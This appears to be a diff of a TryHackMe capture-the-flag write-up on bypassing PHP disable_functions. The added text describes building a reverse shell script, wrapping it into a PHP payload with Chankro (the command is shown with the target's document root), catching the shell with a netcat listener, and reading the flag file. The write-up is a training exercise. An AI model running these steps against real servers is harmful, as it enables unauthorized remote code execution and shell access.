@@ -19,26 +19,25 @@ however, and use `gobuster` for that, e.g.
 With it, we are able to spot the `/uploads/` directory with our sample test image and
 the valuable `phpinfo.php` *PHP Version* page of the webserver configuration. On it, we
 can already spot the *Context Document Root* directory that we'll later need for our
-payload generation to be `/var/www/html/fa5fba5f5a39d27d8bb7fe5f518e00db`.
-
-
-`git clone https://github.com/TarlogicSecurity/Chankro.git`
-
+payload generation to be `/var/www/html/fa5fba5f5a39d27d8bb7fe5f518e00db`. Now, for the
+reverse shell, we can use one of the online tools, such as [^2] and create the
+`reverse_shell.sh` script with our attacking machine IP address and a port number of our
+choice. Note, that we had to encase the spawn of the network connection with a `bash -c`
+to start a new bash session since a direct shell did not work for us. Having done this,
+we now want to use `chankro` to obtain the PHP payload, which can be cloned from GitHub
+with `git clone https://github.com/TarlogicSecurity/Chankro.git` and use it as such on
+our `reverse_shell.sh` bash script.
 ```
 python2 chankro.py --arch 64 --input in.sh --output out.php --path /var/www/html/fa5fba5f5a39d27d8bb7fe5f518e00db
 ```
+
+
 
 `nc -lnvp <PORT>`
 
 
 `cat /home/s4vi/flag.txt`
 
-
-
-
-When browsing to the webpage http://<IP_ADDRESS> it is noticeable that an image
-file for the CV can be uploaded in the "Apply Jobs" section.
-After downloading a random image "payload.png" TBC
 
 
 [^1]: https://tryhackme.com/room/bypassdisablefunctions
